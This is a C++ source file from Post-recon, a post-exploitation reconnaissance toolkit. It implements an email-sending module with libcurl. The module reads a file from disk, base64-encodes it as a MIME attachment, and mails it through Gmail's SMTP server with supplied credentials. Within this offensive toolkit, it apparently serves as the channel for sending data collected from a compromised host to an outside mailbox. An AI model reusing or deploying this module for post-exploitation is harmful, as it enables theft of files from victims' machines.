/*
This file is part of Post-recon
Copyright (C) 2017 @maldevel
https://github.com/maldevel/Post-recon

Post-recon - post-exploitation reconnaissance toolkit.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

For more see the file 'LICENSE' for copying permission.
*/

#include "prLibCurl.h"

#include <curl/curl.h>
#include "prCommon.h"
#include <Strsafe.h>

#define BOUNDARY	"EEmmaaiill__BBoouunnddaarryy"
#define SIZE 4096

struct upload_status {
	char *data;
	int dataLeft;
};

// .:: email headers ::.

// simple email
#define SimpleEmailHeaderLines	7
static const char *simpleEmailHeader[] = {
	"Date: %s\r\n",						//e.g. Mon, 29 Nov 2010 21:54:29 +1100
	"To: %s (%s)\r\n",					//e.g. admin@example.org
	"From: %s (%s)\r\n",				//e.g. support@example.gr(Joe Doe)
	"Message-ID: <%s>\r\n",				//e.g. xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx@example.com
	"Subject: %s\r\n",					//subject
	"\r\n",								//do not remove
	"%s\r\n"							//body
};

// email with attachment
#define AttachmentEmailHeaderLines	17
static const char *emailWithAttachmentHeader[] = {
	"Date: %s\r\n",
	"To: %s (%s)\r\n",
	"From: %s (%s)\r\n",
	"Message-ID: <%s>\r\n",
	"Subject: %s\r\n",
	"MIME-Version: 1.0\r\n",
	"Content-Type: multipart/mixed; boundary=%s\r\n\r\n",
	"--%s\r\n",
	"Content-type: text/plain; charset=UTF-8\r\n",
	"Content-Transfer-Encoding: 7bit\r\n\r\n",
	"%s",														//body message
	"\r\n--%s\r\n",												//boundary
	"Content-Type: application/octet-stream; name=\"%s\"\r\n",
	"Content-Transfer-Encoding: base64\r\n",
	"Content-Disposition: attachment; filename=\"%s\"\r\n\r\n",
	"%s",														//base64 file data
	"\r\n--%s--\r\n",											//"\r\n--%s--" boundary for multiple files
	//"\r\n.\r\n"
};

// :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


//libcurl email callback
static size_t _read_function_callback(void *ptr, size_t size, size_t nmemb, void *userp)
{
	struct upload_status *upload_ctx = (struct upload_status *)userp;
	int dataLen = 0;

	if ((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
		return 0;
	}

	if (upload_ctx->dataLeft) {
		if (upload_ctx->dataLeft > SIZE) {
			dataLen = SIZE;
		}
		else {
			dataLen = upload_ctx->dataLeft;
		}

		memcpy(ptr, upload_ctx->data, dataLen);
		upload_ctx->data += dataLen;
		upload_ctx->dataLeft -= dataLen;

		return dataLen;
	}

	return 0;
}

//build DATE string
static int buildDate(const char *format, char **result)
{
	if (format == NULL) return -1;

	char *_dateTime = 0;
	int _size = 0;

	if ((_dateTime = Common::GetTimezoneOffset()) == NULL) {
		return -1;
	}

	_size = strlen(format) + strlen(_dateTime);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		Common::hFree(_dateTime);
		return -1;
	}

	if (Common::FormatString(*result, _size + 1, format, _dateTime) == -1) {
		Common::hFree(_dateTime);
		return -1;
	}

	Common::hFree(_dateTime);
	return _size;
}

//build to and from strings
static int buildToFrom(const char *format, const char *tofrom, const char *name, char **result)
{
	if (format == NULL || tofrom == NULL || name == NULL) return -1;

	int _size = 0;

	_size = strlen(format) + strlen(tofrom) + strlen(name);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		return -1;
	}

	if (Common::FormatString(*result, _size + 1, format, tofrom, name) == -1) {
		return -1;
	}

	return _size;
}

//build MessageID string
static int buildMessageID(const char *format, const char *from, char **result)
{
	if (format == NULL || from == NULL) return -1;

	char *_messageID = 0;
	int _size = 0;

	if ((Common::GenerateMessageID(from, strlen(from), &_messageID)) == S_FALSE) {
		return -1;
	}

	_size = strlen(format) + strlen(_messageID);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		Common::hFree(_messageID);
		return -1;
	}

	if (Common::FormatString(*result, _size + 1, format, _messageID) == -1) {
		Common::hFree(_messageID);
		return -1;
	}

	Common::hFree(_messageID);
	return _size;
}

//build attachment data
static int buildAttachmentData(const char *format, const char *filepath, char **result)
{
	if (format == NULL || filepath == NULL) return -1;

	int _size = 0;
	int dataSize = 0;
	unsigned char *data = 0;
	char *base64Data = 0;
	int base64DataSize = 0;

	//read file
	if ((dataSize = Common::LoadFileIntoMemory(filepath, &data)) == -1) {
		return -1;
	}

	//convert file to base64 string
	if ((base64DataSize = Common::Base64Encode(data, dataSize, &base64Data)) == -1) {
		Common::hFree(data);
		return -1;
	}

	Common::hFree(data);
	_size = strlen(format) + base64DataSize;

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		Common::hFree(base64Data);
		return -1;
	}

	if (Common::FormatString(*result, _size + 1, format, base64Data) == -1) {
		Common::hFree(base64Data);
		return -1;
	}

	Common::hFree(base64Data);

	return _size;
}

//build string
static int buildString(const char *format, const char *value, char **result)
{
	if (format == NULL || value == NULL) return -1;

	int _size = 0;

	_size = strlen(format) + strlen(value);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		return -1;
	}

	if (Common::FormatString(*result, _size + 1, format, value) == -1) {
		return -1;
	}

	return _size;
}

//build email message
static size_t buildMessage(char **data, int dataLines, const char *to, const char *from, const char *fromName, const char *toName, const char *subject,
	const char *body, const char **emailHeader, int sendAttachment, const char *filepath, const char *filename)
{
	if (from == NULL || fromName == NULL || to == NULL || toName == NULL || subject == NULL || body == NULL || emailHeader == NULL) return -1;

	char **_data = 0;
	size_t totalSize = 0;
	size_t counter = 0;
	int i = 0;

	if ((_data = (char**)Common::hAlloc(dataLines * sizeof(char*))) == NULL) {
		return -1;
	}

	//build DATE string
	if ((counter = buildDate(emailHeader[0], &_data[0])) == -1) {
		return -1;
	}
	totalSize += counter;

	//build TO string
	if ((counter = buildToFrom(emailHeader[1], to, toName, &_data[1])) == -1) {
		Common::hFree(_data);
		return -1;
	}
	totalSize += counter;

	//build FROM string
	if ((counter = buildToFrom(emailHeader[2], from, fromName, &_data[2])) == -1) {
		Common::hFree(_data);
		return -1;
	}
	totalSize += counter;

	//build messageid string
	if ((counter = buildMessageID(emailHeader[3], from, &_data[3])) == -1) {
		Common::hFree(_data);
		return -1;
	}
	totalSize += counter;

	//build subject string
	if ((counter = buildString(emailHeader[4], subject, &_data[4])) == -1) {
		Common::hFree(_data);
		return -1;
	}
	totalSize += counter;

	if (sendAttachment == FALSE) {

		//add new line
		counter = strlen(emailHeader[5]);
		if ((_data[5] = (char*)Common::hAlloc((counter + 1) * sizeof(char))) == NULL) {
			Common::hFree(_data);
			return -1;
		}

		if (Common::CopyString(_data[5], (counter + 1), emailHeader[5]) != 0) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		// append body
		if ((counter = buildString(emailHeader[6], body, &_data[6])) == -1) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;
	}
	else {

		//add mime type
		counter = strlen(emailHeader[5]);
		if ((_data[5] = (char*)Common::hAlloc((counter + 1) * sizeof(char))) == NULL) {
			Common::hFree(_data);
			return -1;
		}

		if (Common::CopyString(_data[5], (counter + 1), emailHeader[5]) != 0) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		// append content-type mixed + define boundary
		if ((counter = buildString(emailHeader[6], BOUNDARY, &_data[6])) == -1) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		//add boundary
		if ((counter = buildString(emailHeader[7], BOUNDARY, &_data[7])) == -1) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		//add content-type for text
		counter = strlen(emailHeader[8]);
		if ((_data[8] = (char*)Common::hAlloc((counter + 1) * sizeof(char))) == NULL) {
			Common::hFree(_data);
			return -1;
		}

		if (Common::CopyString(_data[8], (counter + 1), emailHeader[8]) != 0) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		//append Content - Transfer - Encoding
		counter = strlen(emailHeader[9]);
		if ((_data[9] = (char*)Common::hAlloc((strlen(emailHeader[9]) + 1) * sizeof(char))) == NULL) {
			Common::hFree(_data);
			return -1;
		}

		if (Common::CopyString(_data[9], (strlen(emailHeader[9]) + 1), emailHeader[9]) != 0) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		// append body
		if ((counter = buildString(emailHeader[10], body, &_data[10])) == -1) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		//add boundary
		if ((counter = buildString(emailHeader[11], BOUNDARY, &_data[11])) == -1) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		//content type for attachment
		if ((counter = buildString(emailHeader[12], filename, &_data[12])) == -1) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		//append Content - Transfer - Encoding
		counter = strlen(emailHeader[13]);
		if ((_data[13] = (char*)Common::hAlloc((counter + 1) * sizeof(char))) == NULL) {
			Common::hFree(_data);
			return -1;
		}

		if (Common::CopyString(_data[13], (counter + 1), emailHeader[13]) != 0) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		//Content-Disposition
		if ((counter = buildString(emailHeader[14], filename, &_data[14])) == -1) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		//base64 data
		if ((counter = buildAttachmentData(emailHeader[15], filepath, &_data[15])) == -1) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;

		//add boundary - end
		if ((counter = buildString(emailHeader[16], BOUNDARY, &_data[16])) == -1) {
			Common::hFree(_data);
			return -1;
		}
		totalSize += counter;
	}

	//concat all into one big string
	if ((*data = (char*)Common::hAlloc((totalSize + 1) * sizeof(char)))) {
		for (i = 0; i < dataLines; i++) {
			if (Common::ConcatString(*data, totalSize + 1, _data[i]) == S_FALSE) {
				Common::hFree(*data);
				break;
			}
		}
	}

	for (i = 0; i < dataLines; i++) {
		Common::hFree(_data[i]);
	}
	Common::hFree(_data);

	return totalSize;
}

HRESULT LibCurl::SendEmail(const char *from, const char *fromName, const char *to, const char *toName, const char *subject,
	const char *body, const char *password, int sendAttachment, const char *filepath, const char *filename)
{
	if (from == NULL || fromName == NULL || to == NULL || toName == NULL || subject == NULL || body == NULL || password == NULL) return S_FALSE;

	CURL *curl;
	CURLcode res = CURLE_OK;
	struct curl_slist *recipients = NULL;
	struct upload_status upload_ctx;
	int i = 0;
	char *_emailData;

	Common::init();

	if (sendAttachment == FALSE) {
		upload_ctx.dataLeft = buildMessage(&_emailData, SimpleEmailHeaderLines, to, from, fromName, toName, subject, body, simpleEmailHeader, FALSE, filepath, filename);
	}
	else {
		upload_ctx.dataLeft = buildMessage(&_emailData, AttachmentEmailHeaderLines, to, from, fromName, toName, subject, body, emailWithAttachmentHeader, TRUE, filepath, filename);
	}

	upload_ctx.data = _emailData;

	curl = curl_easy_init();

	if (curl) {

		curl_easy_setopt(curl, CURLOPT_USERNAME, from);
		curl_easy_setopt(curl, CURLOPT_PASSWORD, password);
		curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
		curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from);
		recipients = curl_slist_append(recipients, to);
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
		/*if (base64DataSize > CURLOPT_INFILESIZE_LARGE)
			curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, base64DataSize);*/
		curl_easy_setopt(curl, CURLOPT_READFUNCTION, _read_function_callback);
		curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L); //debug, turn it off on production

		res = curl_easy_perform(curl);
		//if (res != CURLE_OK) {}
		curl_slist_free_all(recipients);
		curl_easy_cleanup(curl);
	}

	Common::hFree(_emailData);
	//Common::hZero((void*)password, strlen(password));

	return (res == CURLE_OK ? S_OK : S_FALSE);
}
